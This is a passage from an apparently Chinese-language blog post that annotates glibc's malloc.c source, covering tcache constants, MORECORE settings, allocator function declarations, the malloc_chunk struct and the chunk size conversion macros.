<span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);<span class="comment">//刷新标准错误流</span></span><br><span class="line">  <span class="built_in">abort</span> ();<span class="comment">//函数被调用以异常终止程序执行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p><strong>代码总结</strong></p>
<ul>
<li>此代码块定义了一个断言失败时的处理机制：<ul>
<li>在程序的调试版本中，如果某个断言失败，<code>__assert_fail</code> 宏会被调用。</li>
<li>宏调用 <code>__malloc_assert</code>，该函数会生成详细的错误信息，并将其输出到标准错误流，然后终止程序。</li>
</ul>
</li>
<li>由于整个处理是通过宏和函数来完成的，因此提供了灵活性和可读性，便于在需要时进行调试，而在发布版本中可以通过定义 <code>NDEBUG</code> 来禁用这些检查。</li>
</ul>
<h2 id="USE-TCACHE"><a href="#USE-TCACHE" class="headerlink" title="USE_TCACHE"></a>USE_TCACHE</h2><p>tcache的初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.定义了 tidx2usize 宏，这个宏用于将bin的idx转换为相应的字节大小。*/</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().定义了 csize2tidx 宏，将一个给定的chunk大小 x 转换为对应的bin idx。 */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="comment">//tcache 中最多 7 个</span></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>这里见名知意，例：tidx2usize —&gt; tcache_idx to unsigned_size</p>
<h2 id="一些设置"><a href="#一些设置" class="headerlink" title="一些设置"></a>一些设置</h2><p>目的：提高项目的可移植性和开启一些优化措施</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  REALLOC_ZERO_BYTES_FREES should be set if a call to</span></span><br><span class="line"><span class="comment">  realloc with zero bytes should be the same as a call to free.</span></span><br><span class="line"><span class="comment">  This is required by the C standard. Otherwise, since this malloc</span></span><br><span class="line"><span class="comment">  returns a unique pointer for malloc(0), so does realloc(p, 0).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//realloc()参数为 0 相当于free</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REALLOC_ZERO_BYTES_FREES 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  TRIM_FASTBINS 控制非常小的内存块的 free() 调用是否可以立即导致内存修剪。</span></span><br><span class="line"><span class="comment">  将其设置为 true (1) 可以减少内存占用，但几乎总是会降低使用大量小块的程序的速度。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  仅在您愿意牺牲一些速度以在释放大量小块内存的程序中更积极地减少系统级内存占用时，</span></span><br><span class="line"><span class="comment">  定义此选项。通过将 MXFAST 设置为 0，您可以获得基本相同的效果，但这可能导致</span></span><br><span class="line"><span class="comment">  使用许多小块的程序出现更大的性能下降。 TRIM_FASTBINS 是一个折中的编译时选项，</span></span><br><span class="line"><span class="comment">  它只禁用那些靠近顶部内存的块被放置在快速链表中。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRIM_FASTBINS  0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 从操作系统获取更多内存的定义。 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE         (*__morecore)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE_FAILURE 0</span></span><br><span class="line"><span class="type">void</span> * __default_morecore (<span class="type">ptrdiff_t</span>);</span><br><span class="line"><span class="type">void</span> *(*__morecore)(<span class="type">ptrdiff_t</span>) = __default_morecore;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  与 MORECORE 相关的声明。默认情况下，依赖于 sbrk。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  MORECORE 是从系统获取更多内存的函数名称。有关编写替代 MORECORE 函数的一般指导，</span></span><br><span class="line"><span class="comment">  以及 WIN32 的版本和 pre-OSX macOS 的示例版本，请参见下文。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE sbrk</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  MORECORE_FAILURE 是 MORECORE 和 mmap 失败时返回的值。</span></span><br><span class="line"><span class="comment">  由于它不能是有效的内存地址，并且必须反映标准系统调用的值，</span></span><br><span class="line"><span class="comment">  因此您可能不应该尝试重新定义它。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_FAILURE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE_FAILURE (-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果 MORECORE_CONTIGUOUS 为真，则利用连续调用 MORECORE </span></span><br><span class="line"><span class="comment">  并使用正参数总是返回连续递增地址的事实。 </span></span><br><span class="line"><span class="comment">  这在 UNIX 的 sbrk 中是正确的。即使没有定义，</span></span><br><span class="line"><span class="comment">  当区域恰好是连续的时，malloc 也允许从不同调用中获得的区域跨越分配。</span></span><br><span class="line"><span class="comment">  但是在适用时定义这个可以启用更强的一致性检查和空间效率。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CONTIGUOUS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MORECORE_CONTIGUOUS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  如果您的 MORECORE 版本在给定负参数时无法将空间释放回系统，</span></span><br><span class="line"><span class="comment">  请定义 MORECORE_CANNOT_TRIM。 </span></span><br><span class="line"><span class="comment">  这通常仅在您使用无法处理负参数的手工编写的 MORECORE 函数时是必要的。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* #define MORECORE_CANNOT_TRIM */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  MORECORE_CLEARS (默认 1)</span></span><br><span class="line"><span class="comment">     被映射到 MORECORE 的例程清零内存的程度：</span></span><br><span class="line"><span class="comment">     从不 (0)、仅对新分配的空间 (1) 或总是 (2)。</span></span><br><span class="line"><span class="comment">     (1) 和 (2) 之间的区别是必要的，因为在某些系统上，</span></span><br><span class="line"><span class="comment">     如果应用程序先将断点值递减，然后再增加，</span></span><br><span class="line"><span class="comment">     则重新分配空间的内容是未指定的。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CLEARS</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MORECORE_CLEARS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   MMAP_AS_MORECORE_SIZE 是使用 mmap 作为备份时，如果 sbrk 失败，则使用的最小 mmap 大小参数。</span></span><br><span class="line"><span class="comment">   该值必须是页面大小的倍数。 </span></span><br><span class="line"><span class="comment">   此备份策略通常仅在系统的地址空间中存在“空洞”时适用，</span></span><br><span class="line"><span class="comment">   这样 sbrk 不能执行连续扩展，但系统上仍然有空间可用。</span></span><br><span class="line"><span class="comment">   对于已知对此有用的系统（即大多数 Linux 内核），</span></span><br><span class="line"><span class="comment">   这仅在程序分配大量内存时发生。</span></span><br><span class="line"><span class="comment">   鉴于此，以及 mmap 区域往往有限，大小应该较大，</span></span><br><span class="line"><span class="comment">   以避免过多的 mmap 调用，从而避免耗尽内核资源。 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MMAP_AS_MORECORE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_AS_MORECORE_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  定义 HAVE_MREMAP 以使 realloc() 使用 mremap() 重新分配大块内存。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HAVE_MREMAP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAVE_MREMAP 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 我们可能需要支持 __malloc_initialize_hook 以实现向后兼容性。 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_24)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> HAVE_MALLOC_INIT_HOOK 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> HAVE_MALLOC_INIT_HOOK 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="一些声明"><a href="#一些声明" class="headerlink" title="一些声明"></a>一些声明</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc()"></a>__libc_malloc()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  这个版本的 malloc 支持标准的 SVID/XPG mallinfo </span></span><br><span class="line"><span class="comment">  函数，该函数返回一个包含使用属性和统计信息的结构体。</span></span><br><span class="line"><span class="comment">  它应该可以在任何符合 SVID/XPG 的系统上工作，该系统在 </span></span><br><span class="line"><span class="comment">  /usr/include/malloc.h 中定义了 struct mallinfo。</span></span><br><span class="line"><span class="comment">  （如果您想自己安装这样的东西，可以根据上面和下面的描述</span></span><br><span class="line"><span class="comment">  删除初步声明，并将其保存到一个 malloc.h 文件中。但实际上</span></span><br><span class="line"><span class="comment">  没有 compelling 的理由去费心去做这件事。）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  主要需要的声明是由 mallinfo() 返回的 mallinfo 结构体。</span></span><br><span class="line"><span class="comment">  SVID/XPG 的 mallinfo 结构体包含了一些在这个版本的 malloc </span></span><br><span class="line"><span class="comment">  中甚至没有意义的字段。这些字段则被 mallinfo() 填充</span></span><br><span class="line"><span class="comment">  为其他可能感兴趣的数字。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------- description of public routines ------------ */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  返回一个指向新分配的至少 n 字节的内存块的指针，如果没有可用空间，则返回 null。</span></span><br><span class="line"><span class="comment">  此外，在失败时，ANSI C 系统上的 errno 被设置为 ENOMEM。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果 n 为零，malloc 返回一个最小大小的块。 </span></span><br><span class="line"><span class="comment">  （在大多数 32 位系统上，最小大小为 16 字节，而在 64 位系统上为 24 或 32 字节。）</span></span><br><span class="line"><span class="comment">  在大多数系统上，size_t 是一种无符号类型，因此对于负参数的调用</span></span><br><span class="line"><span class="comment">  被解释为请求巨大的空间，这通常会失败。</span></span><br><span class="line"><span class="comment">  支持的 n 的最大值在各系统之间有所不同，但在任何情况下都小于</span></span><br><span class="line"><span class="comment">  size_t 的最大可表示值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_malloc(<span class="type">size_t</span>);</span><br><span class="line">libc_hidden_proto (__libc_malloc)<span class="comment">//宏，用于隐藏这个函数的实现细节，使其在外部不可见</span></span><br></pre></td></tr></table></figure>

<h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  free(void* p)</span></span><br><span class="line"><span class="comment">  释放由 p 指向的内存块，该内存块是之前使用 malloc 或相关例程（如 realloc）分配的。</span></span><br><span class="line"><span class="comment">  如果 p 为 null，则没有任何效果。如果 p 已经被释放，则可能会产生任意（即，不良的！）</span></span><br><span class="line"><span class="comment">  效果。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  除非被禁用（使用 mallopt），否则释放非常大的空间时，系统会在可能的情况下</span></span><br><span class="line"><span class="comment">  自动触发将未使用的内存返回给系统的操作，从而减少程序的内存占用。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>     __libc_free(<span class="type">void</span>*);</span><br><span class="line">libc_hidden_proto (__libc_free)<span class="comment">//宏，用于隐藏这个函数的实现细节，使其在外部不可见</span></span><br></pre></td></tr></table></figure>

<h3 id="libc-calloc"><a href="#libc-calloc" class="headerlink" title="__libc_calloc"></a>__libc_calloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  calloc(size_t n_elements, size_t element_size);</span></span><br><span class="line"><span class="comment">  返回指向 n_elements * element_size 字节的指针，并将所有位置设置为零。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_calloc(<span class="type">size_t</span>, <span class="type">size_t</span>);</span><br></pre></td></tr></table></figure>

<h3 id="libc-realloc"><a href="#libc-realloc" class="headerlink" title="__libc_realloc()"></a>__libc_realloc()</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  realloc(void* p, size_t n)</span></span><br><span class="line"><span class="comment">  返回一个大小为 n 的内存块指针，该内存块包含与指针 p 相同的数据，直到 (n, p 的大小) 中的最小值字节。如果没有可用空间，则返回 null。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  返回的指针可能与 p 相同，也可能不同。算法优先选择扩展 p，如果不可能，则使用相当于 malloc-copy-free 的序列。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果 p 为 null，则 realloc 相当于 malloc。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果没有可用空间，realloc 将返回 null，errno 被设置（如果在 ANSI 下），同时 p 不会被释放。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  如果 n 小于 p 当前持有的字节数，新的未使用空间将被截断并在可能的情况下释放。除非定义了 #define REALLOC_ZERO_BYTES_FREES，否则 realloc 的大小参数为零时（重新）分配一个最小大小的块。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  通过 mmap 方式内部获得的大块内存将始终使用 malloc-copy-free 序列扩展，除非系统支持 MREMAP（目前仅限于 Linux）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  不支持旧 Unix realloc 约定，即允许将最后释放的内存块作为 realloc 的参数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_realloc(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">libc_hidden_proto (__libc_realloc)</span><br></pre></td></tr></table></figure>

<h3 id="libc-memalign"><a href="#libc-memalign" class="headerlink" title="__libc_memalign"></a>__libc_memalign</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  memalign(size_t alignment, size_t n);</span></span><br><span class="line"><span class="comment">  返回指向新分配的 n 字节内存块的指针，该内存块的对齐方式符合 alignment 参数的要求。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  alignment 参数应该是 2 的幂。如果参数不是 2 的幂，则使用最近的较大 2 的幂。</span></span><br><span class="line"><span class="comment">  正常的 malloc 调用保证了 8 字节对齐，因此不要使用 8 或更小的参数调用 memalign。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  过度依赖 memalign 会导致内存碎片化。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_memalign(<span class="type">size_t</span>, <span class="type">size_t</span>);</span><br><span class="line">libc_hidden_proto (__libc_memalign)</span><br></pre></td></tr></table></figure>

<h3 id="libc-valloc"><a href="#libc-valloc" class="headerlink" title="__libc_valloc"></a>__libc_valloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  valloc(size_t n);</span></span><br><span class="line"><span class="comment">  等同于 memalign(pagesize, n)，其中 pagesize 是系统的页面大小。</span></span><br><span class="line"><span class="comment">  如果页面大小未知，则使用 4096 字节作为默认值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>*  __libc_valloc(<span class="type">size_t</span>);</span><br></pre></td></tr></table></figure>

<p>跳过，感觉这些没啥意思，跳转978行</p>
<h2 id="DEFAULT-MMAP-MAX"><a href="#DEFAULT-MMAP-MAX" class="headerlink" title="DEFAULT_MMAP_MAX"></a>DEFAULT_MMAP_MAX</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  M_MMAP_MAX 是同时使用 mmap 服务的最大请求数量。</span></span><br><span class="line"><span class="comment">  这个参数存在的原因是，有些系统对 mmap 使用的内部表有数量限制，</span></span><br><span class="line"><span class="comment">  超过一定数量可能会降低性能。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  默认值设置为一个仅作为保护的值。</span></span><br><span class="line"><span class="comment">  将该值设置为 0 会禁用使用 mmap 来处理大请求。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M_MMAP_MAX             -4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MMAP_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MMAP_MAX       (65536)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> RETURN_ADDRESS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RETURN_ADDRESS(X_) (NULL)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="重要函数声明"><a href="#重要函数声明" class="headerlink" title="重要函数声明"></a>重要函数声明</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Forward declarations.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span><span class="comment">//这个指针指向malloc_chunk的头部</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internal routines.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*  _int_malloc(mstate, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     _int_free(mstate, mchunkptr, <span class="type">int</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*  _int_realloc(mstate, mchunkptr, INTERNAL_SIZE_T,</span><br><span class="line">			   INTERNAL_SIZE_T);</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*  _int_memalign(mstate, <span class="type">size_t</span>, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*  _mid_memalign(<span class="type">size_t</span>, <span class="type">size_t</span>, <span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_printerr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span> __<span class="title function_">attribute__</span> <span class="params">((<span class="keyword">noreturn</span>))</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">mem2mem_check</span><span class="params">(<span class="type">void</span> *p, <span class="type">size_t</span> sz)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">top_check</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">munmap_chunk</span><span class="params">(mchunkptr p)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MREMAP</span></span><br><span class="line"><span class="type">static</span> mchunkptr <span class="title function_">mremap_chunk</span><span class="params">(mchunkptr p, <span class="type">size_t</span> new_size)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*   <span class="title function_">malloc_check</span><span class="params">(<span class="type">size_t</span> sz, <span class="type">const</span> <span class="type">void</span> *caller)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>      <span class="title function_">free_check</span><span class="params">(<span class="type">void</span>* mem, <span class="type">const</span> <span class="type">void</span> *caller)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*   <span class="title function_">realloc_check</span><span class="params">(<span class="type">void</span>* oldmem, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">			       <span class="type">const</span> <span class="type">void</span> *caller)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*   <span class="title function_">memalign_check</span><span class="params">(<span class="type">size_t</span> alignment, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">				<span class="type">const</span> <span class="type">void</span> *caller)</span>;</span><br></pre></td></tr></table></figure>

<h2 id="chunk-representations"><a href="#chunk-representations" class="headerlink" title="chunk representations"></a>chunk representations</h2><p>chunk的表示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="chunk的一些计算操作"><a href="#chunk的一些计算操作" class="headerlink" title="chunk的一些计算操作"></a>chunk的一些计算操作</h2><p>mem就是返回给用户的指针，即上面的 fd 的位置</p>
<p>堆地址是由低地址往高地址生长的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ---------- Size and alignment checks and conversions ----------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* conversion from malloc headers to user pointers, and back */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="comment">//计算最小内存块的大小，即从 struct malloc_chunk 结构体中 fd_nextsize 字段的偏移量。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//定义可以分配的最小内存块的大小。它确保计算出的大小是对齐的，使用 MALLOC_ALIGN_MASK 来进行对齐。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="comment">//判断给定内存块指针 p 是否对齐。如果对齐规则是 2 * SIZE_SZ，则直接使用指针 p，否则使用 chunk2mem(p) 进行转换。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line"><span class="meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span></span><br><span class="line"><span class="meta">   &amp; MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span 